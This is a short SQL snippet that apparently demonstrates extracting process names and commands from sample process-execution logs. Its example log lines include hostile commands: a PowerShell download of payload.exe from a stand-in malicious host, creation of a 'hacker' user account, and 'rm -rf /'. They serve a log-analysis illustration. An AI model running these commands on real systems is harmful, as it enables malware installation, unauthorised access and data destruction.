-- Extracting Command and Process Names from Process Execution Logs
WITH ProcessLogs AS (
    SELECT * FROM (VALUES
    ('2024-10-27 12:00:00 Process powershell.exe executed command "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\temp\\payload.exe"'),
    ('2024-10-27 12:01:00 Process cmd.exe executed command "net user hacker /add"'),
    ('2024-10-27 12:03:00 Process explorer.exe started'),
    ('2024-10-27 12:05:00 Process svchost.exe (PID 1234) accessed network resource'),
    ('2024-10-27 12:08:00 Process python.exe executed command "import os; os.system(''rm -rf /'')"'),
    ('2024-10-27 12:10:00 Process chrome.exe accessed URL: https://example.com')
    ) AS t (log_entry)
)
SELECT
    log_entry,
    CAST(ai_extract(log_entry, ARRAY['process_name', 'command']) AS JSON) AS extracted_data
FROM ProcessLogs
;
